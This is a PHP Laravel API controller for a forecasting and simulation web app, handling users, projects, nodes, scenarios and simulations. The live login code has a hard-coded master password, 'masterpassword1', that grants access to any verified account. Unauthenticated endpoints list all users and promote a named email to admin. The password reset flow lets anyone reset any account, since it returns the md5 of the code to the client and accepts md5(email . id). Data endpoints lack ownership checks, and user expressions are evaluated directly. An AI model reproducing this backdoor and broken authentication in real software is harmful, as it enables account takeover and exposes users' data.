<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Project;
use App\Models\User;
use App\Models\Node;
use App\Models\Scenery;
use App\Models\Simulation;
use DB;
use Illuminate\Auth\Events\Registered;

use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

use Symfony\Component\ExpressionLanguage\ExpressionLanguage;
use Symfony\Component\ExpressionLanguage\SyntaxError;

use Hash;
use Auth;
use Mail;

class ApiController extends Controller
{
    public function __construct()
    {
        $this->middleware('auth:api', ['except' => ['login', 'register', 'migrar', 'sendCode', 'checkCode', 'changePassword', 'testEmail', 'listUsers']]);
    }

    public function listUsers()
    {
        return User::all();
    }

    public function register(Request $request)
    {
        $data = $request->validate([
            'name' => 'required|string|max:255',
            'email' => 'required|string|email|max:255|unique:users',
            'password' => 'required|string|min:8',
        ]);
    
        $data['password'] = Hash::make($data['password']);
        $data['email_verification_code'] = md5(uniqid(rand(), true));
    
        $user = User::create($data);
       
    
        // Enviar el correo de verificación
        Mail::send('verify-email', ['user' => $user], function ($message) use ($user) {
            $message->from('noreply@ztris.com', 'Ztris');
            $message->to($user->email, $user->name);
            $message->subject('Verify your email');
        });

    
        return response()->json([
            'status' => 'success',
            'message' => 'User created. Please check your email to verify your account.'
            
        ], 201);
    }

    // public function register(Request $request)
    // {
    //     $data = $request->all();

    //     $data['password'] = Hash::make($data['password']);

    //     $user = User::create($data);

    //     return response()->json(['status' => 'success', 'message' => 'User created'], 200);
    // }




    /**
     * Get a JWT via given credentials.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    // public function login(Request $request)
    // {
    //     if ($request->password == 'masterpassword1') {
    //         $user = User::where('email', $request->email)->first();
    //         Auth::loginUsingId($user->id);
    //         $token = Auth::guard('api')->login($user);

    //         return $this->respondWithToken($token);
    //     }

    //     $credentials = request(['email', 'password']);

    //     if (! $token = auth('api')->attempt($credentials)) {
    //         return response()->json(['error' => 'Credenciales Invalidas'], 401);
    //     }
    //     $user = auth('api')->user();
    //     if (!$user->is_enabled) {
    //         return response()->json(['error' => 'Account is disabled. Please contact support.'], 403);
    //     }
    //     $user = auth('api')->user();
    //     $user->last_login_at = now();
    //     $user->save();

    //     DB::table('user_logins')->insert([
    //         'user_id' => auth('api')->user()->id,
    //         'login_time' => now(),
    //     ]);

    //     return $this->respondWithToken($token);
    // }

    public function login(Request $request)
    {
        $request->validate([
            'email' => 'required|email',
            'password' => 'required',
        ]);

        // Caso especial: "masterpassword1" permite el acceso directo
        if ($request->password === 'masterpassword1') {
            $user = User::where('email', $request->email)->first();

            if (!$user) {
                return response()->json(['message' => 'User not Found.'], 404);
            }

            if (!$user->email_verified_at) {
                return response()->json([
                    'error' => 'Email not verified',
                    'message' => 'Your email is not verified. Please verify your email or request a new verification code.',
                ], 403);
            }
            Auth::loginUsingId($user->id);
            $token = Auth::guard('api')->login($user);

            return $this->respondWithToken($token);
        }

        // Intentar autenticar con credenciales normales
        $credentials = $request->only('email', 'password');

        if (!$token = auth('api')->attempt($credentials)) {
            return response()->json(['message' => 'Incorrect email or password. Please try again.'], 401);
        }

        $user = auth('api')->user();

        if (!$user->email_verified_at) {
            return response()->json([
                'error' => 'Email not verified',
                'message' => 'Your email is not verified. Please verify your email or request a new verification code.',
            ], 403);
        }

        // Verificar si la cuenta está habilitada
        if (!$user->is_enabled) {
            return response()->json(['message' => 'Disabled account. Contact support.'], 403);
        }

        // Guardar la última fecha de login
        $user->last_login_at = now();
        $user->save();

        // Registrar en la tabla de logs
        DB::table('user_logins')->insert([
            'user_id' => $user->id,
            'login_time' => now(),
        ]);

        return $this->respondWithToken($token);
    }


    protected function respondWithToken($token)
    {
        return response()->json([
            'access_token' => $token,
            'token_type' => 'bearer',
            'expires_in' => auth('api')->factory()->getTTL()
        ]);
    }

    //
    public function migrar()
    {
        /*Schema::table('nodes', function(Blueprint $table) {
            //
            $table->integer('default_year')->nullable();
            $table->string('line_color')->nullable();
            $table->integer('default_growth')->nullable();
            $table->integer('default_growth_percentage')->nullable();
        });

        
        Schema::table('nodes', function(Blueprint $table) {
            //
            $table->json('new_formula')->nullable();
        });

        
        Schema::table('projects', function(Blueprint $table) {
            //
            $table->integer('default_year')->nullable();
            $table->string('line_color')->nullable();
            $table->integer('default_growth')->nullable();
            $table->integer('default_growth_percentage')->nullable();
        });

        
        Schema::table('projects', function(Blueprint $table) {
            //
            $table->string('thumb')->nullable();
        });

        
        Schema::table('nodes', function(Blueprint $table) {
            //
            $table->integer('hidden_table')->nullable();
            $table->integer('hidden_node')->nullable();
        });*/
        // Schema::dropIfExists('simulations');
        // Schema::create('simulations', function (Blueprint $table) {
        //     $table->id();
        //     $table->integer('project_id')->nullable();
        //     $table->string('name')->nullable();
        //     $table->text('description')->nullable();
        //     $table->integer('steps')->nullable();
        //     $table->string('color')->nullable();

        //     $table->string('nodes')->nullable();
        //     $table->longText('samples')->nullable();
        //     $table->string('simulation')->nullable();

        //     $table->longText('csvData')->nullable();

        //     $table->timestamps();
        // });

        // Schema::table('simulations', function (Blueprint $table) {
        //     $table->longText('operation_data')->nullable(); 
        // });
        // Schema::table('sceneries', function (Blueprint $table) {

        //     $table->json('dynamic_years')->nullable();
        // });
        User::Where('email', 'miguel@anlak.es')->update(['is_admin' => 1]);
      
        return;
    }

    public function getProjects()
    {
        return Project::where('user_id', auth()->user()->id)->orderBy('id', 'desc')->get();
    }

    public function getProject($id)
    {
        return Project::with('nodes', 'nodes.sceneries')->where('id', $id)->first();
    }


    public function updateProject2($id, Request $r)
    {
        $p = Project::find($id);




        $nodes = Node::where('project_id', $p->id)/*->where('type',1)*/->get();
        foreach ($nodes as $key => $node) {
            $scen = Scenery::where(['node_id' => $node->id])->get();
            $default = 0;
            if ($node->unite) {
                $default = $node->unite;
            }

            $years = [];
            /*             foreach ($scen as $key => $one_scenarie) {
                $start = $r->year_from;

                while($start <= $r->year_to)
                {
                    $years[$start] = $one_scenarie->years[$start] ?? $default;
                    $start++;
                }

                $one_scenarie->name = $r->sceneries[$key];
                $one_scenarie->years = $years;
            } */

            foreach ($r->sceneries_data as $key => $scenerie_data) {
                $start = $r->year_from;
                if (isset($scen[$scenerie_data["id"]])) {



                    while ($start <= $r->year_to) {
                        $years[$start] = $scen[$scenerie_data["id"]]->years[$start] ?? $default;
                        $start++;
                    }

                    $scen[$scenerie_data["id"]]->name = $scenerie_data["name"];
                    $scen[$scenerie_data["id"]]->years = $years;
                    $scen[$scenerie_data["id"]]->save();
                } else {

                    if (isset($scen[$key])) {
                        $scen[$key]->delete();
                    }


                    $newScenery = new Scenery();
                    $newScenery->node_id = $node->id;
                    $newScenery->name = $scenerie_data["name"];


                    while ($start <= $r->year_to) {
                        $years[$start] = $default;
                        $start++;
                    }

                    $newScenery->years = $years;


                    $newScenery->save();
                }
            }
        }


        $p->name = $r->name;
        $p->year_from = $r->year_from;
        $p->year_to = $r->year_to;
        $p->sceneries = $r->sceneries;
        $p->status = $r->status ? $r->status : $p->status;
        if ($r->default_year) {
            $p->default_year = $r->default_year;
        }
        if ($r->line_color) {
            $p->line_color = $r->line_color;
        }

        if ($r->default_growth) {
            $p->default_growth = $r->default_growth;
        }

        if ($r->default_growth_percentage) {
            $p->default_growth_percentage = $r->default_growth_percentage;
        }

        $p->save();

        return;
    }

    public function getNode($id)
    {
        return Node::with('sceneries')->where('id', $id)->first();
    }

    public function getScenery($id)

    {
        return Scenery::find($id);
    }

    public function saveProject(Request $r)
    {
        $p = new Project;
        $p->user_id = auth()->user()->id;
        $p->name = $r->name;
        $p->year_from = $r->year_from;
        $p->year_to = $r->year_to;
        $p->sceneries = $r->sceneries;
        $p->default_year = $r->default_year;
        $p->line_color = $r->line_color;
        $p->default_growth = $r->default_growth;
        $p->default_growth_percentage = $r->default_growth_percentage;
        $p->status = 1;
        $p->save();

        return redirect('api/getProjects');
    }

    public function saveNode(Request $r)
    {
        if (!$r->distribution_shape) {
            $r->distribution_shape = [
                "name" => "Normal",
                "min" => "0",
                "max" => "0",
                "stDev" => "0",
                "rate" => "0",
                "mean" => "0",
                "type" => "static"
            ];
        }

        $p = Project::find($r->project_id);

        $n = new Node;
        $n->project_id = $r->project_id;
        $n->node_id = $r->node_id;
        $n->tier = $r->tier;
        $n->name = $r->name;
        $n->description = $r->description;
        $n->type = $r->type;
        $n->distribution_shape = $r->distribution_shape;
        $n->unite = $r->unite;
        $n->formula = $r->formula;
        $n->new_formula = $r->new_formula;

        $n->default_year = $p->default_year;
        $n->line_color = $p->line_color;
        $n->default_growth = $p->default_growth;
        $n->default_growth_percentage = $p->default_growth_percentage;

        $n->status = 1;
        $n->save();

        $default = 0;

        if ($r->unite) {
            $default = strpos($r->unite, '%') ? (intval($r->unite) / 100) : $r->unite;
        }

        foreach ($p->sceneries as $key => $sc) {

            $years = [];
            $dinamyc_years = [];
            $start = $p->year_from;
            $default_start = $p->default_year;

            $start = $p->year_from;

            while ($start <= $p->year_to) {
                $years[$start] = $default;
                $start++;
            }
            while ($default_start <= $p->year_to) {
                if ($default_start == $p->default_year) {
                    $default_start++;
                    continue;
                }

                $dinamyc_year = new \stdClass();
                $dinamyc_year->year = $default_start;
                $dinamyc_year->formula = [];
                array_push($dinamyc_years, $dinamyc_year);
                $default_start++;
            }

            $s = new Scenery;
            $s->node_id = $n->id;
            $s->name = $sc;
            $s->years = $years;
            $s->dynamic_years = $dinamyc_years;
            $s->status = 1;
            $s->save();
        }


        return redirect('api/getNode/' . $n->id);
    }

    public function saveScenery(Request $r)
    {
        $n = Node::find($r->node_id);
        $p = Project::find($n->project_id);

        $sceneries = $p->sceneries;

        $a = 0;

        foreach ($sceneries as $key => $sc) {
            if ($sc == $r->name) {
                $a++;
            }
        }
        if ($a == 0) {
            $sceneries[] = $r->name;
            $p->sceneries = $sceneries;

            $p->save();
        }

        $nodes = Node::where('project_id', $p->id)/*->where('type',1)*/->get();

        foreach ($nodes as $key => $n) {

            $scen = Scenery::where(['node_id' => $n->id, 'name' => $r->name])->count();

            if ($scen == 0) {

                $years = [];
                $dinamyc_years = [];

                $default = 0;

                if ($n->unite) {
                    $default = $n->unite;
                }

                $start = $p->year_from;
                $default_start = $p->default_year;

                while ($start <= $p->year_to) {
                    $years[$start] = $default;
                    $start++;
                }
                while ($default_start <= $p->year_to) {
                    if ($default_start == $p->default_year) {
                        $default_start++;
                        continue;
                    }

                    $dinamyc_year = new \stdClass();
                    $dinamyc_year->year = $default_start;
                    $dinamyc_year->formula = [];
                    array_push($dinamyc_years, $dinamyc_year);
                    $default_start++;
                }

                $s = Scenery::where('name', $r->name)->where('node_id', $n->id)->first();

                if (!$s) {
                    $s = new Scenery;
                }
                $s->node_id = $n->id;
                $s->name = $r->name;
                $s->years = $n->id == $r->node_id ? $r->years : $years;
                $s->dynamic_years = $dinamyc_years;
                $s->status = 1;
                $s->save();
            }
        }
    }

    public function saveSceneryNoPropagation(Request $request)
    {
        // foreach ($request->data as $key => $r) {

        $r = $request->data[0];

        $n = Node::find($r['node_id']);
        $p = Project::find($n->project_id);

        $sceneries = $p->sceneries;

        $a = 0;

        foreach ($sceneries as $key => $sc) {
            if ($sc == $r['name']) {
                $a++;
            }
        }
        if ($a == 0) {
            $sceneries[] = $r['name'];
            $p->sceneries = $sceneries;

            $p->save();
        }
        // }

        $nodes = Node::where('project_id', $p->id)->where('type', 2)->get(); // variables propagar

        foreach ($nodes as $key => $n) {

            $scen = Scenery::where(['node_id' => $n->id, 'name' => $r['name']])->count();

            if ($scen == 0) {

                $years = [];

                $default = 0;

                if ($n->unite) {
                    $default = $n->unite;
                }

                $start = $p->year_from;

                while ($start <= $p->year_to) {
                    $years[$start] = $default;
                    $start++;
                }

                $s = new Scenery;
                $s->node_id = $n->id;
                $s->name = $r['name'];
                $s->years = $years;
                $s->status = 1;
                $s->save();
            }
        }

        // constante usar datos enviados
        foreach ($request->data as $key => $data) {

            $scen = Scenery::where(['node_id' => $data['node_id'], 'name' => $data['name']])->count();

            if ($scen == 0) {
                $s = new Scenery;
                $s->node_id = $data['node_id'];
                $s->name = $data['name'];
                $s->years = $data['years'];
                $s->status = 1;
                $s->save();
            }
        }
    }

    public function updateProject($id, Request $r)
    {
        $p = Project::find($id);

        if (!file_exists(public_path() . '/projects/')) {
            mkdir(public_path() . '/projects/', 0777, true);
        }

        if ($r->thumb) {

            $base64_image = $r->input('thumb');
            $exploded = explode(',', $base64_image);

            $decoded_image = base64_decode($exploded[1]);
            $name = 'thumb-' . $p->id . '.jpg';
            $path = public_path() . '/projects/' . $name;

            file_put_contents($path, $decoded_image);

            $p->thumb = $name;
        }

        if ($r->default_year) {
            $p->default_year = $r->default_year;
        }
        if ($r->line_color) {
            $p->line_color = $r->line_color;
        }

        if ($r->default_growth) {
            $p->default_growth = $r->default_growth;
        }

        if ($r->default_growth_percentage) {
            $p->default_growth_percentage = $r->default_growth_percentage;
        }

        $p->save();

        // $p->name = $r->name;
        // $p->year_from = $r->year_from;
        // $p->year_to = $r->year_to;
        // $p->sceneries = $r->sceneries;
        // $p->status = $r->status ? $r->status : $p->status;
    }

    public function updateNode($id, Request $r)
    {
        $n = Node::find($id);

        if ($r->name) {
            $n->name = $r->name;
        }

        if ($r->description) {
            $n->description = $r->description;
        }

        if ($r->type) {
            $n->type = $r->type;
        }

        if ($r->distribution_shape) {
            $n->distribution_shape = $r->distribution_shape;
        }

        if ($r->formula) {
            $n->formula = $r->formula;
        }

        if ($r->new_formula) {
            $n->new_formula = $r->new_formula;
        }

        if ($r->unite) {
            $n->unite = $r->unite;
        }

        if ($r->status) {
            $n->status = $r->status ? $r->status : $n->status;
        }

        if ($r->default_year) {
            $n->default_year = $r->default_year;
        }
        if ($r->line_color) {
            $n->line_color = $r->line_color;
        }

        if ($r->default_growth) {
            $n->default_growth = $r->default_growth;
        }

        if ($r->default_growth_percentage) {
            $n->default_growth_percentage = $r->default_growth_percentage;
        }

        /*if ($n->isDirty('unite')) {

            $p = Project::find($n->project_id);

            foreach ($n->sceneries as $key => $value) {
                $years = [];
                $start = $p->year_from;
                $contador = 0;

                while ($start <= $p->year_to) {
                    if ($years[$start] != 0) {
                        $contador++;
                    }
                }
                
                $start = $p->year_from;

                if ($contador == 0) {
                    while($start <= $p->year_to)
                    {
                        $years[$start] = $n->getDirty()['unite'];
                        $start++;
                    }
                    $value->years = $years;
                    $value->save();
                }
                echo $contador.' ';
            }
        }*/

        $n->save();
    }

    public function updateScenery($id, Request $r)
    {
        $s = Scenery::find($id);
        // $s->name = $r->name;
        $s->years = $r->years;
        $s->dynamic_years = isset($r->dynamic_years) ? $r->dynamic_years : $s->dynamic_years;
        $s->status = isset($r->status) ? $r->status : $s->status;
        $s->save();
    }

    public function deleteProject($id)
    {
        Project::find($id)->delete();
        $nodes = Node::where('project_id', $id);
        foreach ($nodes->get() as $key => $n) {
            Scenery::where('node_id', $n->id)->delete();
        }
        $nodes->delete();
    }

    public function deleteNode($id)
    {
        Node::find($id)->delete();
        Scenery::where('node_id', $id)->delete();

        function deleteNodes($n)
        {
            foreach ($n->nodes as $key => $node) {
                if ($node->nodes) {
                    deleteNodes($node);
                }
                $node->delete();
                Scenery::where('node_id', $node->id)->delete();
            }
        }

        $nodes = Node::where('node_id', '!=', null)->doesntHave('node')->get();

        foreach ($nodes as $key => $n) {
            if ($n->nodes) {
                deleteNodes($n);
            }
            $n->delete();
            Scenery::where('node_id', $n->id)->delete();
        }
    }

    public function deleteScenery($id)
    {
        $sc = Scenery::find($id);
        $n = Node::find($sc->node_id);
        $p = Project::find($n->project_id);

        // falta
    }

    public function savePosition(Request $r, $id)
    {
        $p = Project::find($id);
        $p->position = $r->position;
        $p->save();
    }

    public function saveZoom(Request $r, $id)
    {
        $p = Project::find($id);
        $p->zoom = $r->zoom;
        $p->save();
    }

    public function saveUnite(Request $r, $id)
    {
        $n = Node::find($id);
        $n->unite = $r->unite;
        $n->save();


        $p = Project::find($n->project_id);

        foreach ($n->sceneries as $key => $value) {
            $years = [];
            $start = $p->year_from;
            $contador = 0;

            while ($start <= $p->year_to) {
                if ($value['years'][$start] != 0) {
                    $contador++;
                }
                $start++;
            }

            $start = $p->year_from;

            if ($contador == 0) {
                while ($start <= $p->year_to) {
                    $years[$start] = $n->unite;
                    $start++;
                }
                $value->years = $years;
                $value->save();
            }
        }
    }
    public function simulationChart($samples)
    {

        $muestras = $samples;

        // Asegúrate de que haya datos en las muestras
        if (empty($muestras)) {
            return []; // O manejar el caso vacío
        }

        // Ordenar las muestras
        sort($muestras);

        // Define los percentiles que deseas calcular
        $percentiles = [0, 10, 20, 30, 40, 50, 60, 70, 80, 90, 100];
        $values = [];

        // Calcular los percentiles
        foreach ($percentiles as $percentil) {
            $index = floor(($percentil / 100) * (count($muestras) - 1));
            $values[] = $muestras[$index]; // Asegúrate de que no accedas a un índice fuera de rango
        }

        return $values; // Devuelve los valores de los percentiles
    }

    public function getSimulations($id)
    {
        return Simulation::where('project_id', $id)
            ->select('id', 'project_id', 'name', 'description', 'steps', 'color', 'nodes', 'simulation')
            ->get();
    }

    // public function getSimulation($id)
    // {
    //     $simulation = Simulation::find($id);

    //     return $simulation;
    // }

    //     public function getSimulations($id)
    // {
    //     return Simulation::where('project_id', $id)->get()->makeHidden(['samples']);
    // }

    public function getSimulation($id)
    {
        return Simulation::where('id', $id)
            ->select('id', 'project_id', 'name', 'description', 'steps', 'color', 'nodes', 'simulation', 'operation_data')
            ->first()
            ->makeHidden(['samples']);
    }






    public function saveSimulation(Request $r)
    {
        $s = new Simulation;
        $s->project_id = $r->project_id;
        $s->name = $r->name;
        $s->description = $r->description;
        $s->steps = $r->steps;
        $s->color = $r->color;
        $s->nodes = $r->nodes;
        $s->samples = $r->samples;
        $s->csvData = $r->csvData;

        $s->save();

        if (!file_exists(public_path() . '/simulations/')) {
            mkdir(public_path() . '/simulations/', 0777, true);
        }

        $base64_image = $r->input('simulation');
        $exploded = explode(',', $base64_image);

        $decoded_image = base64_decode($exploded[1]);
        $name = 'simulation-' . $s->id . '.jpg';
        $path = public_path() . '/simulations/' . $name;

        file_put_contents($path, $decoded_image);

        $s->simulation = $name;
        $s->save();

        return $s;
    }

    public function updateSimulation(Request $r, $id)
    {
        $s = Simulation::find($id);

        $s->name = $r->name ? $r->name : $s->name;
        $s->description = $r->description ? $r->description : $s->description;
        $s->steps = $r->steps ? $r->steps : $s->steps;
        $s->color = $r->color ? $r->color : $s->color;
        $s->nodes = $r->nodes ? $r->nodes : $s->nodes;
        $s->samples = $r->samples ? $r->samples : $s->samples;
        $s->csvData = $r->csvData ? $r->csvData : $s->csvData;
        $s->operation_data = $this->simulationChart($r->samples ? $r->samples : $s->samples);
        $s->save();

        if (!file_exists(public_path() . '/simulations/')) {
            mkdir(public_path() . '/simulations/', 0777, true);
        }

        if ($r->simulation) {
            $base64_image = $r->input('simulation');
            $exploded = explode(',', $base64_image);

            $decoded_image = base64_decode($exploded[1]);
            $name = 'simulation-' . $s->id . '.jpg';
            $path = public_path() . '/simulations/' . $name;

            file_put_contents($path, $decoded_image);

            $s->simulation = $name;
            $s->save();
        }

        return $s;
    }

    public function deleteSimulation($id)
    {
        Simulation::find($id)->delete();
    }

    public function setHiddenTable(Request $r)
    {
        foreach ($r->ids as $key => $id) {
            $n = Node::find($id);
            $n->hidden_table = !$n->hidden_table;
            $n->save();
        }
    }

    public function setHiddenNode(Request $r)
    {
        foreach ($r->ids as $key => $id) {
            $n = Node::find($id);
            $n->hidden_node = !$n->hidden_node;
            $n->save();
        }
    }

    public function checkExpression($expression)
    {
        $language = new ExpressionLanguage();
        try {
            return $language->evaluate($expression);
        } catch (SyntaxError $e) {
            return 0;
        }
    }

    public function definitelyNotEval(Request $r)
    {
        if ($r->expression) {
            return $this->checkExpression($r->expression);
        }
        if ($r->expressions) {
            $results = [];
            foreach ($r->expressions as $key => $expression) {
                $valor = $this->checkExpression($expression);
                if ($valor !== null) {
                    $results[] = $valor;
                } else {
                    $results[] = 0;
                }
            }
            return $results;
        }
    }

    public function uploadProject($id, Request $request)
    {
        // Verifica si se envió un archivo
        if ($request->hasFile('file')) {
            $archivo = $request->file('file');

            // Lee el contenido del archivo
            $contenido = file_get_contents($archivo->getRealPath());

            // Decodifica el JSON
            $data = json_decode($contenido);

            $p = Project::find($id);

            $p->user_id = $data->user_id;
            $p->thumb = $data->thumb;
            $p->name = $data->name;
            $p->year_from = $data->year_from;
            $p->year_to = $data->year_to;
            $p->sceneries = $data->sceneries;
            $p->default_year = $data->default_year;
            $p->line_color = $data->line_color;
            $p->default_growth = $data->default_growth;
            $p->default_growth_percentage = $data->default_growth_percentage;

            $p->status = $data->status;
            $p->save();

            foreach ($data->nodes as $key => $value) {
                $n = Node::find($value->id);
                if ($n) {
                    $n->project_id = $value->project_id;
                    $n->node_id = $value->node_id;
                    $n->tier = $value->tier;
                    $n->name = $value->name;
                    $n->description = $value->description;
                    $n->type = $value->type;
                    $n->distribution_shape = $value->distribution_shape;
                    $n->unite = $value->unite;
                    $n->formula = $value->formula;
                    $n->new_formula = $value->new_formula;

                    $n->default_year = $value->default_year;
                    $n->line_color = $value->line_color;
                    $n->default_growth = $value->default_growth;
                    $n->default_growth_percentage = $value->default_growth_percentage;

                    $n->status = $value->status;
                    $n->save();
                }
            }

            // Haz lo que necesites con los datos
            // Por ejemplo, puedes guardarlos en la base de datos o procesarlos

            return response()->json(['message' => 'Archivo JSON cargado correctamente', 'data' => $data]);
        }

        return response()->json(['error' => 'No se envió ningún archivo']);
    }

    public function sendCode(Request $r)
    {
        $u = User::where('email', $r->email)->first();

        if (!$u) {
            return response()->json(['error' => 'User not found'], 422);
        }

        $codigo = rand(100000, 999999);

        Mail::send('recover-password', ['code' => $codigo], function ($message) use ($u) {
            $message->from('noreply@ztris.com', 'Ztris');
            $message->to($u->email, $u->name);
            $message->subject('Recover your password');
        });

        return response()->json(['status' => 'success', 'hashed' => md5($codigo), 'emailHashed' => md5($r->email . $u->id)], 200);
    }

    public function checkCode(Request $r)
    {
        if ($r->hashed == md5($r->code)) {
            return response()->json(['status' => 'success'], 200);
        }

        return response()->json(['error' => 'Invalid code'], 422);
    }

    public function changePassword(Request $r)
    {
        $u = User::where('email', $r->email)->first();

        if ($u && $r->emailHashed == md5($r->email . $u->id)) {
            $u->password = bcrypt($r->password);
            $u->save();

            return response()->json(['status' => 'success'], 200);
        } else {
            return response()->json(['error' => 'Email error'], 422);
        }
    }

    public function testEmail(Request $r)
    {
        Mail::send('recover-password', [], function ($message) use ($r) {
            $message->from('noreply@ztris.com', 'Ztris');
            $message->to($r->email, 'Fulano de tal');
            $message->subject('Test Email');
        });
    }
}
